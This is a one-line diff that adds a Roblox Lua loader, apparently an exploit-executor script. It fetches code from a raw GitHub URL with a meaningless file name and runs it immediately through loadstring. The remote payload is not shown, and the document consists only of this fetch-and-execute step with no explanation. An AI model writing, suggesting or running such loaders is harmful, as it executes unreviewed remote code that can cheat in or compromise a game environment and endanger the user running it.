@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/heber126/JojoGame/main/eeeeeeeeeeeeeee",true))() 
